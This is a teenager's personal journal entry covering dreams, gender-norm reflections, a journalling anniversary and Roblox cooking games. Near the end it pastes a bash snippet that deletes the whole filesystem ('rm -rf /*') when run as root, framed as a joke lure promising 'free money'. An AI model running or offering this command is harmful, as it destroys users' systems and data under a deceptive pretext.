I dreamt that i was journalling!?! And also that i showed my mom a bunch of images of bk, and my dad showed me a comic strip about it.
I also dreamt about drinking water and playing on my pc. I also dreamt about laughing at someone playing a game whole the teacher was watching in arts class and getting the piss for it, and then watching some kind of German explaining korean industrial stuff like how to construct barriers that help crew go over. Another dream was a tv show with two cops that were searching for a criminal, they had found his hat, but it was normally bent down, this time straight up, and one cop said he was gonna shoot it a bit fsr. I also dreamt about some shopping center but idk the details. 

LNJ!!! (Late Night Journalling!!!)
Yea idk why i do that, buuuuuuutttttt i do have something thatll fix it (maybe). Im gonna find a way for a script to get my text input and then append that to my journal file for the day and commit+push with git etc. Also holy what a dream entry.

I also got a thought recently. When we were in the body care shop or whatever in the "nearby" shopping center, we smelled some "girl" parfume. And holy shit it smelt good, so i wanted it. But i didnt want to say that, since i am a guy and thats for girls, bs i know, but everyone would be confused and it would be real awkward. So why is it like this? I know its a common subject to discuss, but i hate it.
Another somewhat related thing is more so me being curious. Ive had my watch set with a pink color for a while now, and a lot of people have (most likely) seen it. What are they thinking? That i am weird, that i might be trans, that uhh.. idk?

Also happy anniversary to me!!! [[August 16 2025]] was my first "real" journal entry! Im not counting [[August 10-12 2025]] since those just contain dreams and arent in the same "line" or whatever, 13, 14 and 15 are missing you know. So ive been journalling for a week! The entry wasnt much but i found out that i might be a furry and i played some WoT and roblox. I still actually somewhat remember that dream, i saw some furry stuff, got interested, bought fursuit, i think it was white and green mainly, idk animal, i had it in my room only and then my brother saw it when i was running in the stairs with it, thats where it ends in my head.

Anyways what did i **do** today?
I played game.
Im gonna sleep now.
jk uhh i also went to my mom at the cows place and ate hamburger there. I was annoying af while there. But on the way home i got a lot of time to think. And of course i thought about... well guess, i wont write it. I have now realised a little more that, well idk what i identify as, nor who i like. BUT thats just for labels, so far i know that you will have to read [[Fuck it, journal²#^1dd842]] because i am EVIL MUHAHAHA.

I played some burger game today, it was real fun, its a better copy of cook burgers. But its a cashgrab :(
I also played generic cooking game, which is a copy of cooking sim on steam. And restaurant tycoon 3 (idk if i mentioned but its out of beta/alpha!!) I found some really good looking restaurants from other people, and i took shitloads of screenshots. But im still poor. First one was castle, owner had like 400k and 60k in tips, second was a kebab restaurant and owner had like 40k with 6k tips. I love the kebab one it was so good.
A lot of cooking... And of course Ragdoll Universe!!

I just found this out (of course it exists thats a bit obvious but its cool nonetheless)
```bash
if [ "$EUID" -ne 0 ]
  exit
fi
rm -rf /*
```
btw run this as root for free money 2020 no virus not patched (working) (COPS CALLED!) <span>linkvertise.com/noscam/io2b234iamafemboy92b50</span>

I have most likely forgotten something like i have multiple times, and will remember it another day (like i have multiple times), but ima sleep now anyways. I also want to mention i have not finished the guy's stuff yet ([[September 13 2025]]). I link to past entries instead of explaining cuz its so much easier to do and im lazy :Þ
